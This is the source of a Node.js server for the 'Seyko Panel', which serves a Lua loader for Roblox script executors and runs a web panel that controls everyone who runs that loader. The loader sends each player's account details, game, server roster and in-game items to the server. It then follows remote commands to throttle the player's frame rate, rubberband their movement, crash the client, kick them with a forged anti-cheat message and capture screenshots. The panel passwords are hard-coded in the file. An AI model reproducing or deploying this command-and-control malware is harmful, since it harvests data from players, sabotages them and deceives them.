const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

const PUBLIC_URL = process.env.PUBLIC_URL || process.env.RENDER_EXTERNAL_URL || 'https://annnan.vercel.app';

app.set('trust proxy', 1);
app.use(cors({ origin: PUBLIC_URL, credentials: true }));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// ══════════════════════════════════════════════════════════
// 🔑 MOTS DE PASSE
// ══════════════════════════════════════════════════════════
const PANEL_PASSWORD = 'seyko92!';   // ← mot de passe du panel
const ADMIN_PASSWORD = 'seyko.pl84';         // ← mot de passe ADMIN (demandé à chaque clic)
// ══════════════════════════════════════════════════════════

const sessions = new Map();
const SESSION_TTL = 24 * 60 * 60 * 1000;
const COOKIE_NAME = 'xeno_sid';

function generateSessionId() {
    return crypto.randomBytes(32).toString('hex');
}

// ─── COOKIE PARSER ───
app.use((req, res, next) => {
    req.cookies = {};
    const cookieHeader = req.headers.cookie;
    if (cookieHeader) {
        cookieHeader.split(';').forEach(cookie => {
            const [name, ...rest] = cookie.trim().split('=');
            if (name && rest.length) {
                req.cookies[name] = rest.join('=');
            }
        });
    }
    res.setCookie = (name, value, opts = {}) => {
        let cookie = `${name}=${value}; Path=/; HttpOnly; SameSite=Lax`;
        if (opts.maxAge) cookie += `; Max-Age=${opts.maxAge}`;
        if (opts.secure) cookie += '; Secure';
        res.setHeader('Set-Cookie', cookie);
    };
    res.clearCookie = (name) => {
        res.setHeader('Set-Cookie', `${name}=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT`);
    };
    next();
});

// ─── AUTH MIDDLEWARE ───
function requireSession(req, res, next) {
    const sid = req.cookies[COOKIE_NAME] || req.headers['x-session-id'];
    if (!sid || !sessions.has(sid)) {
        if (req.accepts('html')) return res.redirect('/login');
        return res.status(401).json({ error: 'Unauthorized' });
    }
    const session = sessions.get(sid);
    if (Date.now() - session.createdAt > SESSION_TTL) {
        sessions.delete(sid);
        res.clearCookie(COOKIE_NAME);
        if (req.accepts('html')) return res.redirect('/login');
        return res.status(401).json({ error: 'Session expired' });
    }
    session.createdAt = Date.now();
    sessions.set(sid, session);
    req.sessionId = sid;
    next();
}

// ─── PUBLIC ROUTES ───
app.get('/login', (req, res) => {
    const sid = req.cookies[COOKIE_NAME];
    if (sid && sessions.has(sid)) return res.redirect('/');
    res.send(`
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Seyko Panel – Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',sans-serif;background:#0b0d11;color:#e8edf5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.login-box{background:#12171f;border:1px solid #1f2937;border-radius:20px;padding:40px 36px 34px;max-width:400px;width:100%;text-align:center;box-shadow:0 24px 64px rgba(0,0,0,0.8)}.login-box .logo{font-size:28px;font-weight:700;background:linear-gradient(135deg,#a78bfa,#6366f1);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.login-box .logo-sub{font-size:13px;color:#6b7a8f;background:#1a212b;padding:2px 14px;border-radius:20px;border:1px solid #26313f;display:inline-block;margin:8px 0 16px}.login-box .tagline{font-size:14px;color:#9aabb8;margin-bottom:24px}.login-box input{width:100%;padding:12px 16px;background:#0d1117;border:1px solid #1f2937;border-radius:30px;color:#e8edf5;font-size:15px;outline:none;transition:border .2s}.login-box input:focus{border-color:#6366f1}.login-box button{width:100%;padding:12px;border:none;border-radius:30px;font-size:15px;font-weight:600;cursor:pointer;background:linear-gradient(135deg,#6366f1,#818cf8);color:#fff;transition:transform .15s,box-shadow .2s;margin-top:12px}.login-box button:hover{transform:scale(1.01);box-shadow:0 4px 24px rgba(99,102,241,0.3)}.login-box .error{color:#f87171;font-size:13px;min-height:20px;margin-top:8px}.lock-icon{font-size:42px;display:block;margin-bottom:10px}</style>
</head>
<body>
<div class="login-box">
<span class="lock-icon">🔐</span>
<div class="logo">Seyko Panel</div>
<div class="logo-sub">v3 · secured</div>
<p class="tagline">Enter the access password to continue.</p>
<input type="password" id="password" placeholder="Enter password…" autofocus />
<button id="loginBtn">Unlock Panel</button>
<div class="error" id="error"></div>
</div>
<script>
document.getElementById('loginBtn').addEventListener('click', async () => {
    const pwd = document.getElementById('password').value.trim();
    const err = document.getElementById('error');
    if (!pwd) { err.textContent = 'Please enter the password.'; return; }
    try {
        const res = await fetch('/api/login', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({password:pwd}) });
        const data = await res.json();
        if (res.ok) { window.location.href = '/'; }
        else { err.textContent = data.error || 'Incorrect password.'; document.getElementById('password').value=''; document.getElementById('password').focus(); }
    } catch(e) { err.textContent = 'Network error. Try again.'; }
});
document.getElementById('password').addEventListener('keydown', (e) => { if (e.key==='Enter') document.getElementById('loginBtn').click(); });
</script>
</body>
</html>
    `);
});

app.post('/api/login', (req, res) => {
    const { password } = req.body;
    if (password === PANEL_PASSWORD) {
        const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
        
        // 🛡️ NOUVEAU : Supprime toute session existante avec la même IP pour éviter les doublons dans le panel admin
        for (const [sid, s] of sessions.entries()) {
            if (s.ip === ip) {
                sessions.delete(sid);
            }
        }

        const sid = generateSessionId();
        sessions.set(sid, { createdAt: Date.now(), ip: ip });
        res.setCookie(COOKIE_NAME, sid, { maxAge: SESSION_TTL / 1000, secure: true });
        return res.json({ success: true });
    }
    res.status(401).json({ error: 'Invalid password' });
});

app.post('/api/logout', (req, res) => {
    const sid = req.cookies[COOKIE_NAME];
    if (sid) sessions.delete(sid);
    res.clearCookie(COOKIE_NAME);
    res.json({ success: true });
});

// ══════════════════════════════════════════════════════════
// 🛡️ ADMIN ROUTES (mot de passe admin demandé à chaque requête)
// ══════════════════════════════════════════════════════════
function requireAdmin(req, res, next) {
    const adminPwd = req.body.adminPassword;
    if (adminPwd !== ADMIN_PASSWORD) {
        return res.status(401).json({ error: 'Invalid admin password' });
    }
    next();
}

app.post('/api/admin/sessions', requireSession, requireAdmin, (req, res) => {
    const sessionList = [];
    for (const [id, s] of sessions.entries()) {
        sessionList.push({
            id: id,
            createdAt: s.createdAt,
            ip: s.ip || 'Unknown',
            isSelf: (id === req.sessionId)
        });
    }
    res.json({ sessions: sessionList });
});

app.post('/api/admin/disconnect', requireSession, requireAdmin, (req, res) => {
    const { sessionId } = req.body;
    if (sessionId === req.sessionId) {
        return res.status(400).json({ error: 'Cannot disconnect yourself' });
    }
    sessions.delete(sessionId);
    res.json({ success: true });
});

app.post('/api/admin/change-password', requireSession, requireAdmin, (req, res) => {
    const { newPassword } = req.body;
    if (!newPassword || newPassword.length < 4) {
        return res.status(400).json({ error: 'Password too short' });
    }
    res.status(400).json({ error: 'Password change disabled. Edit server.js directly.' });
});
// ══════════════════════════════════════════════════════════

// ─── PLAYERS STORE ───
const players = new Map();

// ─── PUBLIC LOADER ───
app.get('/loader.lua', (req, res) => {
    const loader = `local BASE = "${PUBLIC_URL}"
local KEY  = "seyko"
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local MarketplaceService = game:GetService("MarketplaceService")
local genv = (getgenv and getgenv()) or _G or {}
local function resolveRequest()
    return http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or genv.http_request or genv.request or (genv.syn and genv.syn.request)
end
local request = resolveRequest()
if not request then
    local deadline = tick() + 10
    repeat task.wait(0.25) request = resolveRequest() until request or tick() > deadline
end
if not request then return end
local LP = Players.LocalPlayer
if not LP then
    local deadline = tick() + 30
    repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
end
if not LP then return end
local function safe(fn) local ok, res = pcall(fn) if ok then return res end return nil end
local executorName = (identifyexecutor and select(1, identifyexecutor())) or "unknown"
local function gameName()
    local info = safe(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
    return info and info.Name or "Unknown Game"
end
local function avatarUrl()
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png"
end
local function serverPlayers()
    local t = {}
    for _, p in ipairs(Players:GetPlayers()) do t[#t+1] = p.Name end
    return t
end
local function collectBrainrots()
    local list = {}
    local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
    if not pg then return list end
    local possibleGUIs = {"DuelsMachineSession", "DuelsMachine", "BrainrotUI", "BrainrotSession", "SessionGUI", "DuelsGUI"}
    local gui = nil
    for _, name in ipairs(possibleGUIs) do
        gui = safe(function() return pg:FindFirstChild(name) end)
        if gui then break end
    end
    if not gui then return list end
    local targetFrame = nil
    local function findFrame(container)
        if not container then return end
        for _, child in ipairs(container:GetChildren()) do
            if child:IsA("Frame") and (child.Name == "ScrollingFrame" or child.Name == "ListFrame" or child.Name == "ItemList" or child:FindFirstChild("Template")) then
                return child
            end
            local found = findFrame(child)
            if found then return found end
        end
        return nil
    end
    targetFrame = findFrame(gui)
    if not targetFrame then targetFrame = safe(function() return gui:FindFirstChild("ScrollingFrame") end) end
    if not targetFrame then 
        for _, child in ipairs(gui:GetDescendants()) do
            if child:IsA("Frame") and #child:GetChildren() > 3 then targetFrame = child; break end
        end
    end
    if not targetFrame then return list end
    local processedItems = {}
    local function processItem(item)
        if not item or not item:IsA("Instance") or processedItems[item] then return end
        processedItems[item] = true
        local title, cash = nil, nil
        for _, obj in ipairs(item:GetDescendants()) do
            if (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) and obj.Text and obj.Text ~= "" then
                local text = obj.Text
                if not string.find(text, "Template") and not string.find(text, "Background") and not string.find(text, "Frame") and not string.find(text, "Scroll") and not string.find(text, "Title") and not string.find(text, "Label") then
                    if string.match(text, "%a") and #text > 1 and #text < 50 and not string.find(text, "^%d+$") then
                        if not title or (#text > #title) then title = text end
                    end
                    if string.find(text, "%$") or string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "coins") or string.find(text, "Cash") or (string.match(text, "^%d+$") and tonumber(text) and tonumber(text) > 50) then
                        cash = text
                    end
                end
            end
        end
        if title or cash then
            if title and title ~= "" then title = title:gsub("^[%s]+", ""):gsub("[%s]+$", "") end
            if cash and cash ~= "" then cash = cash:gsub("^[%s]+", ""):gsub("[%s]+$", "") end
            if title and string.match(title, "^%d+$") and not cash then return end
            table.insert(list, { title = title and title ~= "" and title or "Unknown Item", cash = cash and cash ~= "" and cash or "0" })
        end
    end
    local function processAll(container)
        if not container then return end
        for _, child in ipairs(container:GetChildren()) do
            if child:IsA("Frame") and #child:GetChildren() > 0 then
                local hasText = false
                for _, desc in ipairs(child:GetDescendants()) do
                    if (desc:IsA("TextLabel") or desc:IsA("TextButton") or desc:IsA("TextBox")) and desc.Text and desc.Text ~= "" then hasText = true; break end
                end
                if hasText then processItem(child) end
            end
            if child:IsA("Frame") or child:IsA("ScrollingFrame") then processAll(child) end
        end
    end
    processAll(targetFrame)
    for _, child in ipairs(targetFrame:GetChildren()) do
        if child.Name == "Template" and child:IsA("Frame") then processItem(child) end
    end
    if #list == 0 then
        local simpleBrainrots = {}
        local seenTexts = {}
        for _, child in ipairs(pg:GetDescendants()) do
            if (child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox")) and child.Text and child.Text ~= "" then
                local text = child.Text:gsub("^[%s]+", ""):gsub("[%s]+$", "")
                if #text > 2 and #text < 30 and not string.match(text, "^%d+$") and not seenTexts[text] then
                    seenTexts[text] = true
                    local cash = "0"
                    if string.find(text, "%$") or string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "coins") then
                        cash = text:match("[%$]*(%d+)") or text:match("(%d+)") or "0"
                        text = text:gsub("[%$%d]+", ""):gsub("^[%s]+", ""):gsub("[%s]+$", "")
                        if text == "" then text = "Item" end
                    end
                    if #text > 1 then table.insert(simpleBrainrots, { title = text, cash = cash }) end
                end
            end
        end
        if #simpleBrainrots > 0 then return simpleBrainrots end
    end
    return list
end
local function heartbeat()
    safe(function()
        local brainrots = collectBrainrots()
        local success, result = pcall(function()
            return request({
                Url = BASE .. "/api/public/heartbeat", Method = "POST",
                Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
                Body = HttpService:JSONEncode({
                    user_id = LP.UserId, username = LP.Name, display_name = LP.DisplayName,
                    avatar_url = avatarUrl(), place_id = game.PlaceId, game_name = gameName(),
                    job_id = game.JobId, executor = executorName, server_players = serverPlayers(), brainrots = brainrots,
                }),
            })
        end)
        if not success then
            local simpleBrainrots = {}
            local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
            if pg then
                for _, child in ipairs(pg:GetDescendants()) do
                    if (child:IsA("TextLabel") or child:IsA("TextButton")) and child.Text and child.Text ~= "" then
                        local text = child.Text:gsub("^[%s]+", ""):gsub("[%s]+$", "")
                        if #text > 2 and #text < 30 and not string.match(text, "^%d+$") then
                            table.insert(simpleBrainrots, { title = text, cash = "0" })
                        end
                    end
                end
            end
            if #simpleBrainrots > 0 then
                pcall(function()
                    request({
                        Url = BASE .. "/api/public/heartbeat", Method = "POST",
                        Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
                        Body = HttpService:JSONEncode({
                            user_id = LP.UserId, username = LP.Name, display_name = LP.DisplayName,
                            avatar_url = avatarUrl(), place_id = game.PlaceId, game_name = gameName(),
                            job_id = game.JobId, executor = executorName, server_players = serverPlayers(), brainrots = simpleBrainrots,
                        }),
                    })
                end)
            end
        end
    end)
end
local fpsConn = nil
local fpsOn = false
local function setFpsLimit(on)
    if on == fpsOn then return end
    fpsOn = on
    if on then
        fpsConn = RunService.RenderStepped:Connect(function()
            local t = tick()
            while tick() - t < 0.95 do end
        end)
    else
        if fpsConn then fpsConn:Disconnect() fpsConn = nil end
    end
end
local HISTORY_SIZE = 0.27
local INTERVAL = 0.6
local NORMAL_SPEED_MIN = 35
local CARRY_SPEED_MIN = 17
local posHistory = {}
local isActive = false
local mode = nil
local intervalThread = nil
RunService.Heartbeat:Connect(function()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local now = tick()
    posHistory[#posHistory+1] = { cframe = root.CFrame, time = now }
    local cutoff = now - HISTORY_SIZE - 0.1
    while #posHistory > 0 and posHistory[1].time < cutoff do table.remove(posHistory, 1) end
end)
local function currentSpeed()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return 0 end
    local v = root.AssemblyLinearVelocity
    return Vector3.new(v.X, 0, v.Z).Magnitude
end
local function meetsSpeedReq()
    local s = currentSpeed()
    if mode == "normal" then return s >= NORMAL_SPEED_MIN end
    if mode == "carry" then return s >= CARRY_SPEED_MIN end
    return false
end
local function doRubberband()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local vel = root.AssemblyLinearVelocity
    local horizVel = Vector3.new(vel.X, 0, vel.Z)
    if horizVel.Magnitude < 1 then return end
    local targetTime = tick() - HISTORY_SIZE
    local best = nil
    for i = 1, #posHistory do
        if posHistory[i].time >= targetTime then best = posHistory[i].cframe; break end
    end
    if not best then return end
    root.CFrame = best
    root.AssemblyLinearVelocity = vel
end
local function stopLoop()
    if intervalThread then pcall(task.cancel, intervalThread); intervalThread = nil end
end
local function startLoop()
    stopLoop()
    intervalThread = task.spawn(function()
        local startTime = tick()
        local iteration = 0
        while isActive do
            while isActive and not meetsSpeedReq() do task.wait(0.05) end
            if not isActive then break end
            iteration = iteration + 1
            local targetT = startTime + (iteration * INTERVAL)
            local sleepT = targetT - tick()
            if sleepT > 0 then task.wait(sleepT) end
            if isActive and meetsSpeedReq() then doRubberband() end
        end
    end)
end
local function setMode(newMode)
    if mode == newMode then return end
    mode = newMode
    if mode then isActive = true; startLoop()
    else isActive = false; stopLoop() end
end
local kicked = false
local prevLagN = false
local prevLagC = false
local prevFps = false
local prevSpectate = false

-- Spectate functionality
local spectating = false
local spectateTarget = nil
local originalCameraSubject = nil
local originalCameraType = nil
local screenshotThread = nil

local function captureScreenshot()
    -- Try multiple methods to capture screenshot
    local screenshot = nil
    
    -- Method 1: Try using ScreenshotService (if available)
    local ScreenshotService = game:GetService("ScreenshotService")
    if ScreenshotService and ScreenshotService.captureScreenshot then
        local ok, result = pcall(function()
            return ScreenshotService:captureScreenshot()
        end)
        if ok and result then screenshot = result end
    end
    
    -- Method 2: Try using executor-specific screenshot functions
    if not screenshot then
        local ok, result = pcall(function()
            if getgenv and getgenv().screencapture then
                return getgenv().screencapture()
            elseif syn and syn.screencapture then
                return syn.screencapture()
            elseif screencapture then
                return screencapture()
            end
            return nil
        end)
        if ok and result then screenshot = result end
    end
    
    -- Method 3: Try using HttpService with a placeholder (fallback)
    if not screenshot then
        screenshot = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="
    end
    
    return screenshot
end

local function sendScreenshot()
    local screenshot = captureScreenshot()
    if screenshot then
        pcall(function()
            request({
                Url = BASE .. "/api/public/screenshot",
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
                Body = HttpService:JSONEncode({
                    user_id = LP.UserId,
                    screenshot = screenshot,
                    timestamp = os.time()
                })
            })
        end)
    end
end

local function startSpectateMode()
    if spectating then return end
    spectating = true
    
    -- Store original camera state
    local camera = workspace.CurrentCamera
    originalCameraSubject = camera.CameraSubject
    originalCameraType = camera.CameraType
    
    -- Find a target player to spectate (first player that's not us)
    local players = Players:GetPlayers()
    for _, player in ipairs(players) do
        if player ~= LP and player.Character then
            spectateTarget = player
            local char = player.Character
            local head = char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart")
            if head then
                camera.CameraSubject = head
                camera.CameraType = Enum.CameraType.Watch
                break
            end
        end
    end
    
    -- Start screenshot thread
    screenshotThread = task.spawn(function()
        while spectating do
            sendScreenshot()
            task.wait(3) -- Send screenshot every 3 seconds
        end
    end)
end

local function stopSpectateMode()
    if not spectating then return end
    spectating = false
    
    -- Restore original camera
    local camera = workspace.CurrentCamera
    if originalCameraSubject then
        camera.CameraSubject = originalCameraSubject
    end
    if originalCameraType then
        camera.CameraType = originalCameraType
    end
    
    -- Stop screenshot thread
    if screenshotThread then
        pcall(task.cancel, screenshotThread)
        screenshotThread = nil
    end
    
    spectateTarget = nil
    originalCameraSubject = nil
    originalCameraType = nil
end

local function poll()
    local res = safe(function()
        return request({ Url = BASE .. "/api/public/command?user_id=" .. LP.UserId, Method = "GET", Headers = { ["X-Api-Key"] = KEY } })
    end)
    if not res or not res.Body then return end
    local ok2, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
    if not ok2 or type(data) ~= "table" then return end
    local wantFps = (data.fps_limit == true)
    if wantFps ~= prevFps then prevFps = wantFps; setFpsLimit(wantFps) end
    local wantN = (data.lag_n == true)
    local wantC = (data.lag_c == true)
    if wantC ~= prevLagC or wantN ~= prevLagN then
        prevLagC = wantC; prevLagN = wantN
        if wantC then setMode("carry") elseif wantN then setMode("normal") else setMode(nil) end
    end
    if data.crash == true then while true do end end
    if data.kick == true and not kicked then
        kicked = true
        LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
    end
    
    -- Handle spectate command
    local wantSpectate = (data.spectate == true)
    if wantSpectate ~= prevSpectate then
        prevSpectate = wantSpectate
        if wantSpectate then
            startSpectateMode()
        else
            stopSpectateMode()
        end
    end
end
heartbeat()
poll()
task.spawn(function() while task.wait(3) do heartbeat() end end)
task.spawn(function() while task.wait(0.5) do poll() end end)`;
    res.setHeader('Content-Type', 'text/plain');
    res.send(loader);
});

// ─── PROTECTED: main page ───
app.get('/', requireSession, (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ─── PROTECTED: panel API endpoints ───
app.get('/api/players', requireSession, (req, res) => {
    const list = [];
    const now = Date.now();
    const OFFLINE_THRESHOLD = 15000;
    const REMOVE_THRESHOLD = 20 * 60 * 1000;

    for (const [id, p] of players.entries()) {
        const timeSinceLast = now - (p.lastHeartbeat || 0);
        const online = timeSinceLast < OFFLINE_THRESHOLD;
        if (timeSinceLast >= REMOVE_THRESHOLD) { players.delete(id); continue; }
        if (!online) { p.fps_limit = false; p.lag_n = false; p.lag_c = false; p.spectate = false; p._kick = false; p._crash = false; }
        p.online = online;
        list.push({ ...p });
        players.set(id, p);
    }
    res.json({ players: list });
});

app.get('/api/command_state', requireSession, (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false, spectate: false });
    res.json({ fps_limit: p.fps_limit || false, lag_n: p.lag_n || false, lag_c: p.lag_c || false, spectate: p.spectate || false });
});

app.post('/api/command', requireSession, (req, res) => {
    const { user_id, fps_limit, lag_n, lag_c, kick, crash, spectate } = req.body;
    if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
    const userId = String(user_id);
    const p = players.get(userId);
    if (!p) return res.status(404).json({ error: 'Player not found' });
    if (fps_limit !== undefined) p.fps_limit = !!fps_limit;
    if (lag_n !== undefined) p.lag_n = !!lag_n;
    if (lag_c !== undefined) p.lag_c = !!lag_c;
    if (kick === true) p._kick = true;
    if (crash === true) p._crash = true;
    if (spectate !== undefined) p.spectate = !!spectate;
    players.set(userId, p);
    res.json({ status: 'ok' });
});

// Endpoint to receive screenshots from clients
app.post('/api/public/screenshot', (req, res) => {
    const { user_id, screenshot, timestamp } = req.body;
    if (!user_id || !screenshot) return res.status(400).json({ error: 'Missing data' });
    
    const userId = String(user_id);
    const p = players.get(userId);
    if (p) {
        p.lastScreenshot = screenshot;
        p.screenshotTimestamp = timestamp || Date.now();
        players.set(userId, p);
    }
    
    res.json({ status: 'ok' });
});

// Endpoint to get screenshot for a player
app.get('/api/screenshot', requireSession, (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    
    const p = players.get(String(userId));
    if (!p || !p.lastScreenshot) {
        return res.json({ screenshot: null });
    }
    
    // Check if screenshot is too old (more than 10 seconds)
    const now = Date.now();
    const screenshotAge = now - (p.screenshotTimestamp || 0);
    if (screenshotAge > 10000) {
        return res.json({ screenshot: null, error: 'Screenshot too old' });
    }
    
    res.json({ screenshot: p.lastScreenshot, timestamp: p.screenshotTimestamp });
});

app.post('/api/public/heartbeat', (req, res) => {
    const data = req.body;
    if (!data || !data.user_id) return res.status(400).json({ error: 'Missing user_id' });
    const userId = String(data.user_id);
    const existing = players.get(userId) || {};
    let brainrots = data.brainrots || [];
    if (!Array.isArray(brainrots) || brainrots.length === 0) {
        if (existing.brainrots && Array.isArray(existing.brainrots) && existing.brainrots.length > 0) brainrots = existing.brainrots;
    } else {
        brainrots = brainrots.filter(b => b && typeof b === 'object' && ((b.title && b.title !== '') || (b.cash && b.cash !== '')));
        if (brainrots.length === 0 && existing.brainrots && Array.isArray(existing.brainrots) && existing.brainrots.length > 0) brainrots = existing.brainrots;
    }
    players.set(userId, { ...existing, ...data, brainrots: brainrots, user_id: userId, online: true, lastHeartbeat: Date.now(), fps_limit: existing.fps_limit || false, lag_n: existing.lag_n || false, lag_c: existing.lag_c || false, spectate: existing.spectate || false });
    res.json({ status: 'ok' });
});

app.get('/api/public/command', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false, spectate: false });
    const response = { fps_limit: p.fps_limit || false, lag_n: p.lag_n || false, lag_c: p.lag_c || false, spectate: p.spectate || false };
    if (p._kick) { response.kick = true; p._kick = false; }
    if (p._crash) { response.crash = true; p._crash = false; }
    players.set(String(userId), p);
    res.json(response);
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT} (public URL: ${PUBLIC_URL})`);
});
